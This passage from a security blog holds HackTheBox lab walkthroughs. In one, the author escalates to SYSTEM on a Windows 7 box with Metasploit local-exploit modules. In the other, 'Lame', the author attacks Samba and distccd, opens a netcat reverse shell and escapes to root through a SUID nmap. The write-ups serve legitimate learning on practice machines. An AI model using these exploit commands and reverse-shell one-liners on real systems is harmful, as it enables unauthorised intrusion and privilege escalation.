<pre><code>root@warmachine:/opt/Windows-Exploit-Suggester# ./windows-exploit-suggester.py -u
[*] initiating winsploit version 3.3...
[+] writing to file 2019-07-13-mssb.xls
[*] done

root@warmachine:/opt/Windows-Exploit-Suggester# ./windows-exploit-suggester.py -i sysinfo_devel -d 2019-07-13-mssb.xls 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits
[*] there are now 179 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 32-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
</code></pre><p>The output isn&rsquo;t 100% correct but checking out the different vulns I find this as an metasploit module:</p>
<pre><code>msf5 exploit(multi/handler) &gt; search MS10-015

Matching Modules
================

   #  Name                                     Disclosure Date  Rank   Check  Description
   -  ----                                     ---------------  ----   -----  -----------
   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D


msf5 exploit(multi/handler) &gt; options exploit/windows/local/ms10_015_kitrap0d

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)
</code></pre><p>Okay, so it should work for 32 bit Windows 7. Let&rsquo;s try it:</p>
<pre><code>msf5 exploit(multi/handler) &gt; use exploit/windows/local/ms10_015_kitrap0d
msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set session 1
session =&gt; 1
msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; run

[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Launching notepad to host the exploit...
[+] Process 2276 launched.
[*] Reflectively injecting the exploit DLL into 2276...
[*] Injecting exploit into 2276 ...
[*] Exploit injected. Injecting payload into 2276...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.
</code></pre><p>Erm.. no session? What? And then I saw what I&rsquo;m listening on&hellip; <code>10.0.2.15:4444</code> - my VM NAT address, not my htb VPN address. Quick change and then pwn:</p>
<pre><code>msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set lhost 10.10.14.25
lhost =&gt; 10.10.14.25
msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; run

[*] Started reverse TCP handler on 10.10.14.25:4444 
[*] Launching notepad to host the exploit...
[+] Process 1952 launched.
[*] Reflectively injecting the exploit DLL into 1952...
[*] Injecting exploit into 1952 ...
[*] Exploit injected. Injecting payload into 1952...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.25:4444 -&gt; 10.10.10.5:49160) at 2019-07-13 11:06:27 +0300

meterpreter &gt; getuid 
Server username: NT AUTHORITY\SYSTEM
</code></pre><p>Nice! Let&rsquo;s check the metasploit module for exploit suggesting:</p>
<h3 id="metasploit-local_exploit_suggester">Metasploit local_exploit_suggester</h3>
<pre><code>msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) &gt; set session 1
session =&gt; 1
msf5 post(multi/recon/local_exploit_suggester) &gt; run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 29 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
</code></pre><p>So again there&rsquo;s <code>exploit/windows/local/ms10_015_kitrap0d</code>. I already played with that, I want to check if there&rsquo;s anything else that works on the target. Like MS13-053</p>
<pre><code>msf5 exploit(windows/local/ms10_092_schelevator) &gt; use exploit/windows/local/ms13_053_schlamperei
msf5 exploit(windows/local/ms13_053_schlamperei) &gt; set session 1
session =&gt; 1
msf5 exploit(windows/local/ms13_053_schlamperei) &gt; run

[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Launching notepad to host the exploit...
[+] Process 4080 launched.
[*] Reflectively injecting the exploit DLL into 4080...
[*] Injecting exploit into 4080...
[*] Found winlogon.exe with PID 444
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/ms13_053_schlamperei) &gt; set lhost 10.10.14.25
lhost =&gt; 10.10.14.25
msf5 exploit(windows/local/ms13_053_schlamperei) &gt; set lport 5555
lport =&gt; 5555
msf5 exploit(windows/local/ms13_053_schlamperei) &gt; run

[*] Started reverse TCP handler on 10.10.14.25:5555 
[*] Launching notepad to host the exploit...
[+] Process 976 launched.
[*] Reflectively injecting the exploit DLL into 976...
[*] Injecting exploit into 976...
[*] Found winlogon.exe with PID 444
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.14.25:5555 -&gt; 10.10.10.5:49165) at 2019-07-13 11:15:08 +0300

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre><p>Again after fixing the listening address I get SYSTEM. Let&rsquo;s get my flags and call it a day :)</p>
<pre><code>c:\Users&gt;type c:\users\babis\desktop\user.txt.txt
type c:\users\babis\desktop\user.txt.txt
&lt;...&gt;

c:\Users&gt;type c:\users\administrator\desktop\root.txt.txt
type c:\users\administrator\desktop\root.txt.txt
&lt;...&gt;
</code></pre>

				</div>
				
				<div class="post">

					<div class="post-heading">
						<h1><a href="https://www.offsec.dev/posts/lame/">HackTheBox - Lame Walkthrough</a></h1>
						<span>Jul 10, 2019</span>
					</div>

					<p><img src="https://flamesec.com/images/lame/header.png" alt="Lame"></p>
<blockquote>
<p>I decided to start HackTheBox from the beginning and do a writeup while doing every box. The first one in the list is <em>Lame</em>. An easy box based on Metasploitable. Hope those posts can help someone other than me, but in the end I&rsquo;m doing them for learning/note taking - if you have any complaints/suggestions/questions - hit me at twitter.</p>
</blockquote>
<h2 id="1-recon-and-information-gathering">1. Recon and Information gathering</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# nmap -sV -sC 10.10.10.3 -oN base_tcp.nmap
Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-07-10 21:14 EEST
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.3
Host is up <span style="color:#f92672">(</span>0.044s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">996</span> filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.25
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">1024</span> 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">2048</span> 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2d23h01m54s, deviation: 0s, median: -2d23h01m54s
| smb-os-discovery: 
|   OS: Unix <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">)</span>
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|_  System time: 2019-07-07T11:12:55-04:00
|_smb2-time: Protocol negotiation failed <span style="color:#f92672">(</span>SMB2<span style="color:#f92672">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 56.99 seconds</code></pre></div>
<h3 id="services">SERVICES</h3>
<h4 id="ftp">FTP</h4>
<p>With my fist look at the nmap results I notice the <code>vsftpd</code> version - <em>2.3.4</em> - and I know I have &ldquo;something&rdquo; here :) Quick search with <code>searchsploit</code> yield results as I remember:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# searchsploit vsftpd
------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                      |  Path
                                                                                                                                    | <span style="color:#f92672">(</span>/usr/share/exploitdb/<span style="color:#f92672">)</span>
------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
vsftpd 2.0.5 - <span style="color:#e6db74">&#39;CWD&#39;</span> <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> Remote Memory Consumption                                                                      | exploits/linux/dos/5814.pl
vsftpd 2.0.5 - <span style="color:#e6db74">&#39;deny_file&#39;</span> Option Remote Denial of Service <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                      | exploits/windows/dos/31818.sh
vsftpd 2.0.5 - <span style="color:#e6db74">&#39;deny_file&#39;</span> Option Remote Denial of Service <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                      | exploits/windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                    | exploits/linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                                                                              | exploits/unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------</code></pre></div>
<p>I&rsquo;ll leave this for a minute and check the other services.</p>
<h4 id="smb">SMB</h4>
<p>As <code>nmap</code> tells me I have <code>smb</code> ports open - 139 and 445. I&rsquo;ll take a look at those after playing with the ftp service.</p>
<h2 id="2-gaining-footholdexploiting">2. Gaining foothold/Exploiting</h2>
<p>Now, the ftp service. That version of vsftpd is backdoored - <a href="https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html">https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html</a>. Lets copy the script from the <code>searchsploit</code> result to my working directory:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# searchsploit -m exploits/unix/remote/17491.rb
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>
      URL: https://www.exploit-db.com/exploits/17491
     Path: /usr/share/exploitdb/exploits/unix/remote/17491.rb
File Type: Ruby script, ASCII text, with CRLF line terminators

Copied to: /hackthebox/lame/17491.rb</code></pre></div>
<p>The script is for <code>metasploit</code> but since I have some far away plans of taking OSCP - I&rsquo;ll do my best to skip using it (or at least skip it as a primary tool&hellip;). Looking throught the script it looks like I have to send a smiley face: <code>:)</code> on the <code>USER</code> input and&hellip; uh-oh&hellip; it errors out if there&rsquo;s anonymous login enabled. Guess I can&rsquo;t exploit that now. Also there are no files/folders in the anonymous ftp - what a let down :/. So I&rsquo;ll check the smb then:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# smbclient -L 10.10.10.3
Enter WORKGROUP<span style="color:#ae81ff">\r</span>oot<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service <span style="color:#f92672">(</span>lame server <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">))</span>
	ADMIN$          IPC       IPC Service <span style="color:#f92672">(</span>lame server <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">))</span>
Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME</code></pre></div>
<p>Mm now I have something more interesting. Lets check my permissions:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# smbmap -H 10.10.10.3
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finding open SMB ports....
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User SMB session establishd on 10.10.10.3...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.3:445	Name: 10.10.10.3                                        
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	tmp                                               	READ, WRITE
	opt                                               	NO ACCESS
	IPC$                                              	NO ACCESS
	ADMIN$                                            	NO ACCESS</code></pre></div>
<p>Oh, look at that - I can read/write to tmp&hellip; but not that useful at the moment</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# smbclient //10.10.10.3<span style="color:#ae81ff">\\</span>tmp
Enter WORKGROUP<span style="color:#ae81ff">\r</span>oot<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Anonymous login successful
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:48:37 <span style="color:#ae81ff">2019</span>
  ..                                 DR        <span style="color:#ae81ff">0</span>  Sun May <span style="color:#ae81ff">20</span> 21:36:12 <span style="color:#ae81ff">2012</span>
  .ICE-unix                          DH        <span style="color:#ae81ff">0</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:10:18 <span style="color:#ae81ff">2019</span>
  .X11-unix                          DH        <span style="color:#ae81ff">0</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:10:42 <span style="color:#ae81ff">2019</span>
  .X0-lock                           HR       <span style="color:#ae81ff">11</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:10:42 <span style="color:#ae81ff">2019</span>
  5144.jsvc_up                        R        <span style="color:#ae81ff">0</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:11:24 <span style="color:#ae81ff">2019</span>

		<span style="color:#ae81ff">7282168</span> blocks of size 1024. <span style="color:#ae81ff">5678792</span> blocks available
smb: <span style="color:#ae81ff">\&gt;</span> </code></pre></div>
<p>Searching about smb version 3.0.20 I get an interesting result - CVE-2007-2447 - Samba &ldquo;username map script&rdquo; Command Execution. And since I want to skip the metasploit some googling leads me to this script <a href="https://gist.githubusercontent.com/joenorton8014/19aaa00e0088738fc429cff2669b9851/raw/6e1ae37e0061be103fd733b16266d26379a7f4ba/samba-usermap-exploit.py">https://gist.githubusercontent.com/joenorton8014/19aaa00e0088738fc429cff2669b9851/raw/6e1ae37e0061be103fd733b16266d26379a7f4ba/samba-usermap-exploit.py</a></p>
<p>Generating new payload for my host and substituting it in the script + installing <code>pysmb</code> with <code>pip</code> and executing&hellip; BAM! Got root..</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Ncat: Connection from 10.10.10.3:55941.
id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span></code></pre></div>
<p>That was easy.. I&rsquo;ll forget I have the shell and check if there&rsquo;s something more.</p>
<p>Let&rsquo;s enumerate some more and check all ports</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# nmap -p- 10.10.10.3 -oN all_tcp.nmap
Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-07-10 22:53 EEST
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.3
Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65530</span> filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd</code></pre></div>
<p>Uh-oh <code>distccd</code>&hellip; Now that&rsquo;s interesting. Googling around I found this: <a href="https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html">https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html</a> and the nse script <a href="https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse">https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse</a> :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse -O /usr/share/nmap/scripts/distcc-exec.nse
--2019-07-10 23:05:45--  https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse
Resolving svn.nmap.org <span style="color:#f92672">(</span>svn.nmap.org<span style="color:#f92672">)</span>... 45.33.49.119, 2600:3c01::f03c:91ff:fe98:ff4e
Connecting to svn.nmap.org <span style="color:#f92672">(</span>svn.nmap.org<span style="color:#f92672">)</span>|45.33.49.119|:443... connected.
HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
Length: <span style="color:#ae81ff">3519</span> <span style="color:#f92672">(</span>3.4K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/plain<span style="color:#f92672">]</span>
Saving to: ‘/usr/share/nmap/scripts/distcc-exec.nse’

/usr/share/nmap/scripts/distcc-exec.nse     100%<span style="color:#f92672">[========================================================================================</span>&gt;<span style="color:#f92672">]</span>   3.44K  --.-KB/s    in 0s      

2019-07-10 23:05:46 <span style="color:#f92672">(</span><span style="color:#ae81ff">186</span> MB/s<span style="color:#f92672">)</span> - ‘/usr/share/nmap/scripts/distcc-exec.nse’ saved <span style="color:#f92672">[</span>3519/3519<span style="color:#f92672">]</span>

root@warmachine:/hackthebox/lame# 
root@warmachine:/hackthebox/lame# nmap -p <span style="color:#ae81ff">3632</span> 10.10.10.3 --script distcc-exec --script-args<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;distcc-exec.cmd=&#39;id&#39;&#34;</span>
Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-07-10 23:06 EEST
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.3
Host is up <span style="color:#f92672">(</span>0.040s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-exec: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE <span style="color:#f92672">(</span>Exploitable<span style="color:#f92672">)</span>
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 <span style="color:#f92672">(</span>HIGH<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>AV:N/AC:M/Au:N/C:C/I:C/A:C<span style="color:#f92672">)</span>
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>
|   
|     References:
|       https://distcc.github.io/security.html
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2004-2687

Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.52 seconds</code></pre></div>
<p>Finally - let&rsquo;s get shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# nmap -p <span style="color:#ae81ff">3632</span> 10.10.10.3 --script distcc-exec --script-args<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;distcc-exec.cmd=&#39;/bin/nc 10.10.14.25 4747 -e /bin/sh&#39;&#34;</span>
Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-07-10 23:27 EEST


root@warmachine:/hackthebox/lame# nc -lvnp <span style="color:#ae81ff">4747</span>
Ncat: Version 7.70 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
Ncat: Listening on :::4747
Ncat: Listening on 0.0.0.0:4747
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:34633.
id
uid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span></code></pre></div>
<h2 id="3-enumerating-the-system">3. Enumerating the system</h2>
<p>First thing - first: <code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code> and then - <code>LinEnum.sh</code></p>
<p>Interesting stuff:</p>
<pre><code>[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
-rwsr-xr-x 1 root root 46084 Mar 31  2008 /usr/bin/mtr
</code></pre><p><em>Whoa!</em> that&rsquo;s almost like metasploitable :D Oh, wait</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daemon@lame:/tmp$ cat /root/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w<span style="color:#f92672">==</span> msfadmin@metasploitable</code></pre></div>
<p>not <em>like</em>, I guess&hellip;</p>
<p>I&rsquo;ll play with the SUIDs  - with the help of gtfobins - <a href="https://gtfobins.github.io">https://gtfobins.github.io</a></p>
<h4 id="nmap-suid">nmap SUID</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daemon@lame:/tmp$ nmap --interactive
nmap --interactive

Starting Nmap V. 4.53 <span style="color:#f92672">(</span> http://insecure.org <span style="color:#f92672">)</span>
Welcome to Interactive Mode -- press h &lt;enter&gt; <span style="color:#66d9ef">for</span> help
nmap&gt; !sh
!sh
sh-3.2# id
id
uid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>
sh-3.2# cat /root/root.txt
cat /root/root.txt
&lt;...&gt;

sh-3.2# cat /home/makis/user.txt
cat /home/makis/user.txt
&lt;...&gt;</code></pre></div>
<p>For some reason I couldn&rsquo;t make the <code>mtr</code> SUID work&hellip; it errors out? :/</p>
<p>That&rsquo;s pretty much it&hellip; a lot of vulnerabilities and misconfigurations. <code>LinEnum.sh</code> showed more interesting stuff but looking at them I think they were &ldquo;patched&rdquo; for the sake of making the machine not that vulnerable.</p>


				</div>
				

				<div class="text-center">
					


				</div>

			</div>
			<div class="col-sm-1 col-md-3 col-md-4">
			</div>
		</div>
	</div>



<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-166758470-1', 'auto');
	
	ga('send', 'pageview');
}
</script>



<script  src="https://www.offsec.dev/js/canvas.js"></script>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>

<script src="https://www.offsec.dev/js/bootstrap.min.js"></script>
<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="offsec" data-description="If you like this content" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FF813F" data-position="right" data-x_margin="10" data-y_margin="10"></script>
</body>
</html>
